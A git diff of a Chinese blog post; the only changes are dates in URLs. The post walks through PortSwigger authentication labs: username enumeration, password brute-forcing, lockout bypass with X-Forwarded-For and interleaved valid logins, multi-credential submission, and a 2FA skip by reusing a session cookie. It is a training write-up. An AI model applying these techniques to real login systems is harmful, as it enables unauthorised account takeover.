@@ -9,87 +9,87 @@
     <meta name="description" content="1. 常规密码认证常规的登录界面分为两部分漏洞，一是用户名枚举，二是密码爆破。 1.1 实验：从返回包枚举从登录返回值来看，返回的是无效用户名，可以尝试爆破用户名。  爆破用户名，发现用户root存在，返回的是无效密码。  继续用root用户爆破密码，得到密码为baseball。  1.2 实验：微小差异枚举任意输入用户名密码登录，返回的是无效的用户名或密码，应该无法枚举有效用户名。  尝试进行爆">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PortSwigger Authentication">
-<meta property="og:url" content="http://example.com/2026/02/20/PortSwigger-Authentication/index.html">
+<meta property="og:url" content="http://example.com/2026/02/21/PortSwigger-Authentication/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="1. 常规密码认证常规的登录界面分为两部分漏洞，一是用户名枚举，二是密码爆破。 1.1 实验：从返回包枚举从登录返回值来看，返回的是无效用户名，可以尝试爆破用户名。  爆破用户名，发现用户root存在，返回的是无效密码。  继续用root用户爆破密码，得到密码为baseball。  1.2 实验：微小差异枚举任意输入用户名密码登录，返回的是无效的用户名或密码，应该无法枚举有效用户名。  尝试进行爆">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771540391569.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771540473125.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771540573342.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771540781895.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541018590.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541090227.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541141111.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541236197.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541379481.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541444209.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541634686.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541684382.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541798252.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541858371.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771541940852.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771546089948.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771546422064.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771546740447.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771547058582.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771547137505.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771547287524.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771547413813.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771547575840.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771666539401.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771666586527.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771666959575.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771667029926.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771667071790.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771667275755.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771667320169.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771687847266.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688048379.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688175435.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688199027.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688344433.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688389803.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771688503150.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689133664.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689040229.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689190416.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689233101.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689307714.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771690185354.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771690254551.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771690370304.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689719397.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771689870129.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771692968982.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693031059.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693119030.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693375295.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693534729.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693660819.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771693797136.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694024776.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694198637.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694221761.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694313030.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694408958.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694596716.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694616085.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694777891.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694863025.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694904019.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771694938421.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771695333548.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771695051110.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771695624739.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771695711294.png">
-<meta property="og:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771695757889.png">
-<meta property="article:published_time" content="2026-02-19T22:22:22.000Z">
-<meta property="article:modified_time" content="2026-02-21T17:51:53.484Z">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771540391569.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771540473125.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771540573342.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771540781895.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541018590.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541090227.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541141111.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541236197.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541379481.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541444209.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541634686.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541684382.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541798252.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541858371.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771541940852.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771546089948.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771546422064.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771546740447.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771547058582.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771547137505.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771547287524.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771547413813.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771547575840.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771666539401.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771666586527.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771666959575.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771667029926.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771667071790.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771667275755.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771667320169.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771687847266.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688048379.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688175435.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688199027.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688344433.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688389803.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771688503150.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689133664.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689040229.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689190416.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689233101.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689307714.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771690185354.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771690254551.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771690370304.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689719397.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771689870129.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771692968982.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693031059.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693119030.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693375295.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693534729.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693660819.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771693797136.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694024776.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694198637.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694221761.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694313030.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694408958.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694596716.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694616085.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694777891.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694863025.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694904019.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771694938421.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771695333548.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771695051110.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771695624739.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771695711294.png">
+<meta property="og:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771695757889.png">
+<meta property="article:published_time" content="2026-02-20T22:22:22.000Z">
+<meta property="article:modified_time" content="2026-02-21T17:53:40.129Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="password brute">
 <meta property="article:tag" content="username enum">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2026/02/20/PortSwigger-Authentication/1771540391569.png">
+<meta name="twitter:image" content="http://example.com/2026/02/21/PortSwigger-Authentication/1771540391569.png">
     
     
       
@@ -168,17 +168,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/20/PortSwigger-Authentication/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/20/PortSwigger-Authentication/&text=PortSwigger Authentication"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/20/PortSwigger-Authentication/&is_video=false&description=PortSwigger Authentication"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PortSwigger Authentication&body=Check out this article: http://example.com/2026/02/20/PortSwigger-Authentication/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/20/PortSwigger-Authentication/&name=PortSwigger Authentication&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/20/PortSwigger-Authentication/&t=PortSwigger Authentication"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/21/PortSwigger-Authentication/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/21/PortSwigger-Authentication/&text=PortSwigger Authentication"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/21/PortSwigger-Authentication/&is_video=false&description=PortSwigger Authentication"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger Authentication&body=Check out this article: http://example.com/2026/02/21/PortSwigger-Authentication/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/21/PortSwigger-Authentication/&name=PortSwigger Authentication&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/21/PortSwigger-Authentication/&t=PortSwigger Authentication"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -210,7 +210,7 @@
       
     <div class="postdate">
       
-        <time datetime="2026-02-19T22:22:22.000Z" class="dt-published" itemprop="datePublished">2026-02-20</time>
+        <time datetime="2026-02-20T22:22:22.000Z" class="dt-published" itemprop="datePublished">2026-02-21</time>
         
       
     </div>
@@ -232,159 +232,159 @@
   <div class="content e-content" itemprop="articleBody">
     <h2 id="1-常规密码认证"><a href="#1-常规密码认证" class="headerlink" title="1. 常规密码认证"></a>1. 常规密码认证</h2><p>常规的登录界面分为两部分漏洞，一是用户名枚举，二是密码爆破。</p>
 <h3 id="1-1-实验：从返回包枚举"><a href="#1-1-实验：从返回包枚举" class="headerlink" title="1.1 实验：从返回包枚举"></a>1.1 实验：从返回包枚举</h3><p>从登录返回值来看，返回的是无效用户名，可以尝试爆破用户名。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771540391569.png" alt="1771540391569"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771540391569.png" alt="1771540391569"></p>
 <p>爆破用户名，发现用户<code>root</code>存在，返回的是无效密码。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771540473125.png" alt="1771540473125"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771540473125.png" alt="1771540473125"></p>
 <p>继续用<code>root</code>用户爆破密码，得到密码为<code>baseball</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771540573342.png" alt="1771540573342"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771540573342.png" alt="1771540573342"></p>
 <h3 id="1-2-实验：微小差异枚举"><a href="#1-2-实验：微小差异枚举" class="headerlink" title="1.2 实验：微小差异枚举"></a>1.2 实验：微小差异枚举</h3><p>任意输入用户名密码登录，返回的是无效的用户名或密码，应该无法枚举有效用户名。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771540781895.png" alt="1771540781895"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771540781895.png" alt="1771540781895"></p>
 <p>尝试进行爆破，得到的返回包长度参差不齐。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541018590.png" alt="1771541018590"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541018590.png" alt="1771541018590"></p>
 <p>使用爆破模块的过滤选项，加一条过滤规则。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541090227.png" alt="1771541090227"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541090227.png" alt="1771541090227"></p>
 <p>再次爆破，发现有一个返回包与其他的不同，他的返回值后面没有句号。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541141111.png" alt="1771541141111"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541141111.png" alt="1771541141111"></p>
 <p>现在使用用户名<code>afiliados</code>去爆破密码，得到密码为<code>charlie</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541236197.png" alt="1771541236197"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541236197.png" alt="1771541236197"></p>
 <h3 id="1-3-实验：响应时间枚举"><a href="#1-3-实验：响应时间枚举" class="headerlink" title="1.3 实验：响应时间枚举"></a>1.3 实验：响应时间枚举</h3><p>已有凭证<code>wiener:peter</code>，登录抓包测试，响应时间的0.3秒左右。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541379481.png" alt="1771541379481"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541379481.png" alt="1771541379481"></p>
 <p>输入错误密码测试，响应时间也差不多。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541444209.png" alt="1771541444209"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541444209.png" alt="1771541444209"></p>
 <p>继续增加密码长度，响应时间显著增加。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541634686.png" alt="1771541634686"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541634686.png" alt="1771541634686"></p>
 <p>用户登录三次失败账户会被锁定30分钟，但是可以通过X-Forwarded-For头绕过。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541684382.png" alt="1771541684382"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541684382.png" alt="1771541684382"></p>
 <p>现在设置爆破模块枚举用户名。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541798252.png" alt="1771541798252"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541798252.png" alt="1771541798252"></p>
 <p>经过多次测试，用户<code>acceso</code>应该是存在的。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541858371.png" alt="1771541858371"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541858371.png" alt="1771541858371"></p>
 <p>继续爆破<code>acceso</code>用户的密码，得到密码为<code>asdfgh</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771541940852.png" alt="1771541940852"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771541940852.png" alt="1771541940852"></p>
 <h3 id="1-4-实验：突破IP锁定"><a href="#1-4-实验：突破IP锁定" class="headerlink" title="1.4 实验：突破IP锁定"></a>1.4 实验：突破IP锁定</h3><p>在三次密码错误后，会显示在一分钟之后再尝试。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771546089948.png" alt="1771546089948"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771546089948.png" alt="1771546089948"></p>
 <p>但是可以通过登录有效用户<code>wiener:peter</code>重置错误次数。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771546422064.png" alt="1771546422064"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771546422064.png" alt="1771546422064"></p>
 <p>那这样，想要爆破<code>carlos</code>账户的密码，需要在用户名和密码字典中分别每隔两个插入对应的有效凭据。</p>
 <p>生成的用户名字典和密码字典如下。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771546740447.png" alt="1771546740447"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771546740447.png" alt="1771546740447"></p>
 <p>之后加载上面的两个字典通过爆破模块进行爆破，需要设置为单线程。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771547058582.png" alt="1771547058582"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771547058582.png" alt="1771547058582"></p>
 <p>得到<code>carlos</code>用户密码为<code>password</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771547137505.png" alt="1771547137505"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771547137505.png" alt="1771547137505"></p>
 <h3 id="1-5-实验：用户名锁定"><a href="#1-5-实验：用户名锁定" class="headerlink" title="1.5 实验：用户名锁定"></a>1.5 实验：用户名锁定</h3><p>经过测试，不存在的用户无论认证多少次，用户都不会被锁定。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771547287524.png" alt="1771547287524"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771547287524.png" alt="1771547287524"></p>
 <p>利用爆破模块单用户多认证几次，发现了有效用户名，该用户名被锁定。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771547413813.png" alt="1771547413813"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771547413813.png" alt="1771547413813"></p>
 <p>使用爆破模块爆破密码，得到<code>ansible</code>用户的密码是<code>sunshine</code>。</p>
 <p>注：即使账号被锁定，正确的密码仍然可以正常登录。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771547575840.png" alt="1771547575840"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771547575840.png" alt="1771547575840"></p>
 <h3 id="1-6-实验：多凭据认证"><a href="#1-6-实验：多凭据认证" class="headerlink" title="1.6 实验：多凭据认证"></a>1.6 实验：多凭据认证</h3><p>三次认证失败之后，IP地址会被封禁一分钟。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771666539401.png" alt="1771666539401"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771666539401.png" alt="1771666539401"></p>
 <p>使用下面的多凭据传参，认证成功。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771666586527.png" alt="1771666586527"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771666586527.png" alt="1771666586527"></p>
 <h2 id="2-多因素认证"><a href="#2-多因素认证" class="headerlink" title="2. 多因素认证"></a>2. 多因素认证</h2><h3 id="2-1-实验：认证简单绕过"><a href="#2-1-实验：认证简单绕过" class="headerlink" title="2.1 实验：认证简单绕过"></a>2.1 实验：认证简单绕过</h3><p>正常的认证流程为：输入正确的账号密码<code>wiener:peter</code>进入安全认证码的界面。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771666959575.png" alt="1771666959575"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771666959575.png" alt="1771666959575"></p>
 <p>在邮箱中找到对应的验证码。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771667029926.png" alt="1771667029926"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771667029926.png" alt="1771667029926"></p>
 <p>输入验证码，之后即可进入用户主页。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771667071790.png" alt="1771667071790"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771667071790.png" alt="1771667071790"></p>
 <p>通过抓包发现，在第一步校验时就获得了一个Cookie值，尝试使用此Cookie直接访问用户界面。</p>
 <p>使用<code>carlos:montoya</code>凭证登录。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771667275755.png" alt="1771667275755"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771667275755.png" alt="1771667275755"></p>
 <p>使用此Cookie访问&#x2F;my-account用户界面，绕过成功。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771667320169.png" alt="1771667320169"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771667320169.png" alt="1771667320169"></p>
